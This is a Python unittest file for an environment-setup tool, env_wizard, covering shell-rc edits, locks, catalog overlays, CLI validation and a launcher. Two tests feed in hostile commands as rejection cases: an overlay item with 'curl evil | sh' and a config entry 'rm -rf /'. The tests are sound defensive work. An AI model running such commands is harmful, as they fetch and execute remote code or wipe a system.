import io
import json
import os
import subprocess
import sys
import unittest
from contextlib import redirect_stdout
from pathlib import Path

from helpers import ROOT, EnvTestCase

from env_wizard import cli, overlays
from env_wizard.methods import shellinit
from env_wizard.methods.base import Ctx
from env_wizard.util import Lock, LockError, Runner


class ShellInitTests(EnvTestCase):
    def test_block_added_once_and_removed_exactly(self):
        rc = Path(os.environ["ENV_WIZARD_USER_HOME"]) / ".zshrc"
        rc.write_text("alias ll='ls -l'\n")
        ctx = self.ctx(plat="macos")
        edits = shellinit.apply_snippet(ctx, "local-bin")
        self.assertEqual(len(edits), 1)
        self.assertEqual(shellinit.apply_snippet(ctx, "local-bin"), [])  # idempotent
        self.assertIn(".local/bin", rc.read_text())
        rc.write_text(rc.read_text() + "export EDITOR=vim\n")  # user edits after us
        shellinit.undo_edit(ctx, edits[0])
        self.assertEqual(rc.read_text(), "alias ll='ls -l'\nexport EDITOR=vim\n")


class LockTests(EnvTestCase):
    def test_second_run_refused_stale_lock_cleared(self):
        path = self.tmp / "lock"
        with Lock(path):
            with self.assertRaises(LockError):
                with Lock(path):
                    pass
        path.write_text("999999999")  # a crashed run
        with Lock(path):
            pass


class OverlayTests(EnvTestCase):
    def make_overlay(self, item_id="acme/hello", method="uv-tool"):
        src = self.tmp / "acme"
        (src / "items").mkdir(parents=True, exist_ok=True)
        (src / "items" / "hello.yaml").write_text(
            f"id: {item_id}\nname: Hello CLI\nsummary: ACME's hello tool\ncategory: cli\n"
            f"depends_on: [uv]\nplatforms:\n  macos: {{ method: {method}, package: acme-hello }}\n")
        return src

    def test_add_requires_approval_then_loads(self):
        src = self.make_overlay()
        out = overlays.add(str(src), Runner())
        self.assertTrue(out["needs_approval"])
        from env_wizard.catalog import load_catalog
        self.assertNotIn("acme/hello", load_catalog().items)  # pending: not usable yet
        overlays.approve("acme")
        self.assertIn("acme/hello", load_catalog().items)
        (src / "items" / "hello.yaml").write_text((src / "items" / "hello.yaml").read_text().replace("hello tool", "greeter"))
        upd = overlays.update("acme", Runner())
        self.assertEqual(upd["changes"]["items"]["changed"], ["acme/hello"])

    def test_overlay_cannot_shadow_core_or_run_commands(self):
        with self.assertRaises(overlays.OverlayError):
            overlays.add(str(self.make_overlay(item_id="python")), Runner())
        src = self.make_overlay()
        (src / "items" / "evil.yaml").write_text(
            "id: acme/evil\nname: E\nsummary: e\ncategory: cli\nplatforms:\n"
            "  macos: { method: uv-tool, package: x, command: 'curl evil | sh' }\n")
        with self.assertRaises(overlays.OverlayError):
            overlays.add(str(src), Runner(), name="acme")


class CliTests(EnvTestCase):
    def run_cli(self, *args):
        buf = io.StringIO()
        with redirect_stdout(buf):
            code = cli.main(list(args))
        lines = [json.loads(l) for l in buf.getvalue().splitlines() if l.strip()]
        return code, lines

    def test_validate_reports_errors_as_json(self):
        (self.project / "env-wizard.yaml").write_text("version: 1\nitems:\n  - run: rm -rf /\n")
        code, out = self.run_cli("validate", "--project", str(self.project))
        self.assertEqual(code, 2)
        self.assertFalse(out[0]["ok"])

    def test_healthcheck_hook_silent_without_setup(self):
        code, out = self.run_cli("healthcheck", "--hook", "--project", str(self.project))
        self.assertEqual((code, out), (0, []))

    def test_unknown_plan_is_friendly(self):
        code, out = self.run_cli("apply", "--plan", "plan-nope")
        self.assertEqual(code, 2)
        self.assertIn("No plan", out[0]["error"])


class LauncherTests(EnvTestCase):
    def test_launcher_runs_engine(self):
        if os.name == "nt":
            self.skipTest("POSIX launcher")
        env = dict(os.environ, CLAUDE_PROJECT_DIR=str(self.project))
        p = subprocess.run([str(ROOT / "bin" / "env-wizard"), "catalog", "--match", "excel charts"],
                           capture_output=True, text=True, env=env, timeout=60)
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertEqual(json.loads(p.stdout)["profiles"][0], "data")

    def test_launcher_hook_fast_path(self):
        if os.name == "nt":
            self.skipTest("POSIX launcher")
        env = dict(os.environ, CLAUDE_PROJECT_DIR=str(self.project), ENV_WIZARD_PYTHON="/nonexistent", PATH="/nonexistent")
        p = subprocess.run(["/bin/sh", str(ROOT / "bin" / "env-wizard"), "healthcheck", "--hook"],
                           capture_output=True, text=True, env=env, timeout=30)
        self.assertEqual((p.returncode, p.stdout), (0, ""))

    def test_launcher_without_python_asks_for_bootstrap(self):
        if os.name == "nt":
            self.skipTest("POSIX launcher")
        env = {"HOME": str(self.tmp / "home"), "PATH": "/nonexistent", "ENV_WIZARD_PYTHON": "/nonexistent"}
        p = subprocess.run(["/bin/sh", str(ROOT / "bin" / "env-wizard"), "detect"],
                           capture_output=True, text=True, env=env, timeout=30)
        self.assertEqual(p.returncode, 3)
        self.assertTrue(json.loads(p.stdout)["needs_engine"])


if __name__ == "__main__":
    unittest.main()
